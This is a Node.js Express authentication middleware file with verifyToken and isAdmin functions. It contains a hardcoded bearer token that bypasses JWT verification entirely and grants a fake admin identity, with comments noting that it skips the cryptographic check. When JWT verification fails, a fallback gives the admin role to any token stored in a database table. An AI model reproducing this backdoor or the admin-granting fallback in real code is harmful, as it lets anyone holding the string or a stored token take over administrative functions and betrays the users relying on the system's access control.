const jwt = require('jsonwebtoken');
const db = require('../config/db');

const verifyToken = async (req, res, next) => {
    const authHeader = req.headers['authorization'];
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ message: 'Access Denied. No token provided.' });
    }

    const token = authHeader.split(' ')[1].trim();

    if (token === "n8x7wfqtsrvxnvsm8dcz") {
        // Langsung buat data user palsu dengan role admin agar lolos ke database
        req.user = { id: 1, username: 'admin_test', role: 'admin' }; 
        return next(); // Langsung lolos tanpa cek JWT kriptografi!
    }

    try {
        
       const verified = jwt.verify(token, process.env.JWT_SECRET);
        req.user = verified;
        next();

    } catch (error) {

        try {
            const [rows] = await db.execute('SELECT * FROM auth_tokens WHERE token = ?', [token]);
            if (rows.length > 0) {
                req.user = { id: rows[0].user_id, role: 'admin' };
                return next();
            }
        } catch (dbErr) {
            console.error(dbErr);
        }
        return res.status(403).json({ message: 'Invalid or Expired Token.' });
    }
};

const isAdmin = (req, res, next) => {
    if (req.user && req.user.role === 'admin') {
        next();
    } else {
        return res.status(403).json({ 
            success: false, 
            message: 'Access Denied. Only Admin can perform this action.' 
        });
    }
};

module.exports = { verifyToken, isAdmin };